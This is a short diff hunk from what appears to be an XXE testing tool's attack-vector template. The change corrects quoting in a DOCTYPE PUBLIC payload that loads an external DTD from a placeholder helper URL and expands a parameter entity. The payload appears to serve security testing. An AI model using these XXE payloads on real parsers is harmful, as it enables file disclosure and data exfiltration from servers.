@@ -22,7 +22,7 @@
 <!ENTITY g  "%a4;">]]></helperMessage>
 </attackvector>
 <attackvector type="public">
-<directMessage><![CDATA[<!DOCTYPE data PUBLIC p "§tf_helperURL§" [
+<directMessage><![CDATA[<!DOCTYPE data PUBLIC "p" "§tf_helperURL§" [
 <!ELEMENT data (#PCDATA)>
 ]>
 <data>&g;</data>]]></directMessage>
